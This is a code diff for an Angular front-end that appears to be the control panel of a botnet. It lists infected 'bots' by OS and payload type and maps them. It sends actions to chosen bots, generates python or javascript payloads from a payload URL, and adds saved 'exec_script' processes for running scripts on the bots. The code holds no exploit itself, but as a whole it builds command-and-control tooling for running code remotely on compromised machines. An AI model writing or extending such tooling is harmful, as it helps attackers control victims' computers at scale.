@@ -15,6 +15,9 @@ import { DomSanitizer } from '@angular/platform-browser';
 import { TranslateService } from '@ngx-translate/core';
 import * as L from 'leaflet';
 import 'leaflet.markercluster';
+import { Chart } from 'chart.js/auto';
+import { ProcessDto } from 'models/ProcessDto';
+import { ProcessService } from '@services/ProcessService';
 
 const markerIcon: string = 'assets/marker.png';
 const activeMarkerIcon: string = 'assets/marker-active.png';
@@ -26,10 +29,10 @@ const activeMarkerIcon: string = 'assets/marker-active.png';
 })
 export class FrontpageComponent implements OnInit {
     form!: FormGroup;
+    processForm!: FormGroup;
     payloadForm!: FormGroup;
 
     bots: BotDto[] = [];
-    filterCurrentBots: Boolean = false;
     selectedBot: BotDto = {} as BotDto;
     paramEntries: Array<[string, any]> = [];
 
@@ -37,13 +40,25 @@ export class FrontpageComponent implements OnInit {
     payloadTypes: string[] = ['python', 'javascript'];
 
     isModalOpen = false;
+    isProcessModalOpen = false;
     isActionModalOpen = false;
+    isLargeResponseModalOpen = false;
     isPayloadGenModalOpen = false;
     allBotsSelected = false;
     isFloatingMenuOpen = false;
 
+    largeResult: string = "";
+    botFilter: string = "all";
+    activityFilter: string = "all";
+
     map: any;
     markers: any;
+
+    osChartDom: any;
+    payloadChartDom: any;
+
+    osChart: any;
+    payloadChart: any;
 
     @Output() actionSubmitted: EventEmitter<ActionDto> = new EventEmitter<ActionDto>();
 
@@ -51,6 +66,13 @@ export class FrontpageComponent implements OnInit {
         selectedBots: [],
         actionType: '',
         parameters: new Map<string, any>(),
+    };
+
+    formProcessData: ProcessDto = {
+        name: "",
+        description: "",
+        actionType: 'exec_script',
+        parameters: "",
     };
 
     payloadFormData: any = {
@@ -62,6 +84,7 @@ export class FrontpageComponent implements OnInit {
         private fb: FormBuilder,
         private http: HttpClient,
         private botWebSocketService: BotWebSocketService,
+        private processService: ProcessService,
         private toastr: ToastrService,
         private cdr: ChangeDetectorRef,
         private sanitizer: DomSanitizer,
@@ -75,12 +98,18 @@ export class FrontpageComponent implements OnInit {
             actionType: [this.formData.actionType, Validators.required],
             parameters: [this.formData.parameters, Validators.required],
         });
+
+        this.processForm = this.fb.group({
+            name: [this.formProcessData.actionType, Validators.required],
+            description: [this.formProcessData.description, Validators.required],
+            actionType: [this.formProcessData.actionType, { validators: [Validators.required, Validators.nullValidator] }],
+            parameters: [this.formProcessData.parameters, { validators: [Validators.required, Validators.nullValidator] }],
+        });
+
         this.payloadForm = this.fb.group({
             payloadType: [this.formData.selectedBots, Validators.required],
             payloadUrl: [this.formData.actionType, Validators.required],
         });
-        // Initialize formData with default values
-        this.actionTypes = Utils.getActionTypes();
         // initialize default payload url from backend
         this.getDefaultPayloadUrlTarget();
 
@@ -130,11 +159,120 @@ export class FrontpageComponent implements OnInit {
                 }
             }
             this.refreshMapPoints();
+            this.refreshChart();
         });
 
         setTimeout(() => {
             this.initMap();
         }, 0);
+
+
+        this.updateActionTypes();
+    }
+
+    updateActionTypes(): void {
+        // Initialize formData with default values
+        this.actionTypes = Utils.getActionTypes();
+        this.processService.findAll().subscribe({
+            next: (response) => {
+                if (!!response.error) {
+                    this.toastr.error('Error loading processes');
+                    throw new Error(`Response status: ${response.status}`);
+                }
+                response.forEach((process: ProcessDto) => {
+                    this.actionTypes.push(
+                        {
+                            name: process.name,
+                            description: process.description,
+                            value: process.actionType,
+                            parameters: new Map<string, any>([["value", process.parameters]])
+                        }
+                    )
+                });
+            },
+            error: (error) => {
+                this.toastr.error('Error loading processes');
+                console.error('Error:', error);
+            }
+        }
+        );
+    }
+
+    refreshChart(): void {
+        this.osChartDom = document.querySelector('#osChart');
+        this.payloadChartDom = document.querySelector('#payloadTypeChart');
+
+        if (!!this.bots && this.bots.length > 0) {
+            if (!!this.osChartDom) {
+                const osGroup = Object.groupBy(this.bots, (b: BotDto) => b.os);
+                const osChartData = {
+                    labels: Object.keys(osGroup),
+                    datasets: [{
+                        label: 'OS type',
+                        data: Object.values(osGroup).map((b: BotDto[] | undefined) => b ? b.length : 0),
+                        borderWidth: 1
+                    }]
+                };
+
+                if (!!this.osChart) {
+                    this.osChart.data = osChartData;
+                    this.osChart.options = {
+                        responsive: true,
+                        animation: {
+                            duration: 0
+                        }
+                    };
+                    this.osChart.update({ duration: 0 });
+                }
+                else
+                    this.osChart = new Chart(this.osChartDom, {
+                        type: 'pie',
+                        data: osChartData,
+                        options: {
+                            responsive: true,
+                        }
+                    });
+            }
+
+            if (!!this.payloadChartDom) {
+                const payloadGroup = Object.groupBy(this.bots, (b: BotDto) => b.payloadType);
+                const payloadChartData = {
+                    labels: Object.keys(payloadGroup),
+                    datasets: [{
+                        label: 'Payload type',
+                        data: Object.values(payloadGroup).map((b: BotDto[] | undefined) => b ? b.length : 0),
+                        borderWidth: 1
+                    }]
+                };
+
+                if (!!this.payloadChart) {
+                    this.payloadChart.data = payloadChartData;
+                    this.payloadChart.options = {
+                        responsive: true,
+                        animation: {
+                            duration: 0
+                        }
+                    };
+                    this.payloadChart.update({ duration: 0 });
+                }
+                else
+                    this.payloadChart = new Chart(this.payloadChartDom, {
+                        type: 'pie',
+                        data: payloadChartData,
+                        options: {
+                            responsive: true,
+                        }
+                    });
+
+            }
+
+            window.addEventListener('resize', () => {
+                if (this.osChart)
+                    this.osChart.resize();
+                if (this.payloadChart)
+                    this.payloadChart.resize();
+            });
+        }
     }
 
     initMap() {
@@ -177,11 +315,11 @@ export class FrontpageComponent implements OnInit {
                         const marker = L.marker([lat, lng]);
                         let iconUrl = bot.lastSignal >= Date.now() - 5 * 60 * 1000 ? activeMarkerIcon : markerIcon;
                         marker.setIcon(new L.Icon({
-                            iconUrl: iconUrl, 
+                            iconUrl: iconUrl,
                             className: "marker-icon",
                             iconSize: [25, 41],
                             iconAnchor: [13, 41],
-                            popupAnchor: [13, 0]
+                            popupAnchor: [0, -41]
                         }));
                         marker.bindPopup(`<b>${bot.name}</b>`);
                         marker.addTo(this.markers);
@@ -206,6 +344,13 @@ export class FrontpageComponent implements OnInit {
         });
         if (this.form.valid) {
             this.postRequestData({ ...this.form.value });
+        } else
+            this.toastr.error("Error detected in fields validation, please check the form and try again");
+    }
+
+    submitProcessForm = () => {
+        if (this.processForm.valid) {
+            this.postProcessRequestData({ ...this.processForm.value });
         } else
             this.toastr.error("Error detected in fields validation, please check the form and try again");
     }
@@ -242,11 +387,11 @@ export class FrontpageComponent implements OnInit {
     }
 
 
-    updateActionType = (event: any) => {
-        const actionTypeValue = event.target.value;
+    updateActionTypeSelected = (event: any) => {
+        const actionElementIndex = event.target.value;
         // we copy the map parameters from the actionTypes object
         this.formData.parameters = new Map<string, any>();
-        let actionTypeDto = this.actionTypes.find((action: any) => action.value === actionTypeValue);
+        let actionTypeDto = this.actionTypes[actionElementIndex];
         if (!!actionTypeDto && !!actionTypeDto.parameters) {
             // Convert the parameters object to a Map
             for (const key of actionTypeDto.parameters.keys()) {
@@ -255,6 +400,7 @@ export class FrontpageComponent implements OnInit {
                 this.formData.parameters.set(key, value);
             }
             this.paramEntries = this.getFormDataParameterEntries();
+            this.formData.actionType = actionTypeDto.value;
         }
         this.cdr.detectChanges();
     }
@@ -269,13 +415,14 @@ export class FrontpageComponent implements OnInit {
     }
 
     selectAllBots = () => {
-        if (this.formData?.selectedBots.length === this.bots.length) {
+        let currentAllBots = this.getBots();
+        if (this.formData?.selectedBots.length === currentAllBots.length) {
             this.formData.selectedBots = [];
         }
         else {
-            this.formData.selectedBots = this.bots.map((bot: BotDto) => bot.id);
+            this.formData.selectedBots = currentAllBots.map((bot: BotDto) => bot.id);
         }
-        this.allBotsSelected = this.formData?.selectedBots.length === this.bots.length;
+        this.allBotsSelected = this.formData?.selectedBots.length === currentAllBots.length;
     }
 
     selectBot = (botId: string) => {
@@ -288,6 +435,11 @@ export class FrontpageComponent implements OnInit {
         this.allBotsSelected = this.formData?.selectedBots.length === this.bots.length;
     }
 
+    updateBotFilter = (event: any) => {
+        this.formData.selectedBots = [];
+        this.allBotsSelected = false;
+    }
+
     openModal = () => {
         this.isModalOpen = true;
         this.formData = {
@@ -297,34 +449,81 @@ export class FrontpageComponent implements OnInit {
         };
     }
 
+    openProcessModal = () => {
+        this.isProcessModalOpen = true;
+        this.processForm.setValue({
+            name: "",
+            description: "",
+            actionType: "exec_script",
+            parameters: ""
+        });
+    }
+
+    openModalForSingleBot = (botId: string) => {
+        this.formData.selectedBots = [botId];
+        this.allBotsSelected = this.formData?.selectedBots.length === this.bots.length;
+        this.openModal();
+    }
+
     openActionsModal = (botId: string) => {
         this.selectedBot = this.bots.find((bot: BotDto) => bot.id === botId) || {} as BotDto;
         if (!!this.selectedBot)
             this.isActionModalOpen = true;
     }
 
+    openLargeResponseModal = (response: string) => {
+        this.largeResult = response;
+        this.isLargeResponseModalOpen = true;
+    }
+
     openPayloadGenModal = () => {
         this.isPayloadGenModalOpen = true;
     }
 
-    toggleResultsTimeLimit = () => {
-        this.filterCurrentBots = !this.filterCurrentBots;
-    }
+    getBots = (overrideFilter: string = "") => {
+        let filteredBots = this.bots;
 
-    getBots = () => {
-        return this.bots;
-    }
+        switch (this.activityFilter) {
+            case "active":
+                filteredBots = filteredBots.filter((bot: BotDto) => bot.lastSignal >= Date.now() - 5 * 60 * 1000);
+                break;
+            case "last-hour":
+                filteredBots = filteredBots.filter((bot: BotDto) => bot.lastSignal >= Date.now() - 60 * 60 * 1000);
+                break;
+        }
 
-    getActiveBots = () => {
-        return this.bots.filter((bot: BotDto) => bot.lastSignal >= Date.now() - 5 * 60 * 1000);
+        switch (this.botFilter) {
+            case "windows":
+                filteredBots = filteredBots.filter((bot: BotDto) => bot.os === "Windows");
+                break;
+            case "linux":
+                filteredBots = filteredBots.filter((bot: BotDto) => bot.os === "Linux");
+                break;
+            case "mac":
+                filteredBots = filteredBots.filter((bot: BotDto) => bot.os === "MacOs");
+                break;
+            case "other":
+                filteredBots = filteredBots.filter((bot: BotDto) => !["Windows", "Linux"].includes(bot.os));
+                break;
+        }
+        return filteredBots;
     }
 
     closeModal = () => {
         this.isModalOpen = false;
     }
 
+    closeProcessModal = () => {
+        this.isProcessModalOpen = false;
+    }
+
     closeActionsModal = () => {
         this.isActionModalOpen = false;
+    }
+
+    closeLargeResponseModal = () => {
+        this.isActionModalOpen = true;
+        this.isLargeResponseModalOpen = false;
     }
 
     closePayloadGenModal = () => {
@@ -450,6 +649,24 @@ export class FrontpageComponent implements OnInit {
                 },
                 error => {
                     this.toastr.error('An error occurred', "Error occurred while sending an order to bot " + data.selectedBots + ", check console for more information");
+                    console.error('Error:', error);
+                }
+            );
+    }
+
+    /* 
+      Post new process
+    */
+    postProcessRequestData = (data: ProcessDto) => {
+        this.http.post<any>(`${environment.apiUrl}/createprocess`, data)
+            .subscribe(
+                data => {
+                    this.toastr.success('Process created', "Process " + data.name + " created successfully.");
+                    this.updateActionTypes();
+                    this.closeProcessModal();
+                },
+                error => {
+                    this.toastr.error('An error occurred creating process', "Error occurred while sending the request, check console for more information");
                     console.error('Error:', error);
                 }
             );
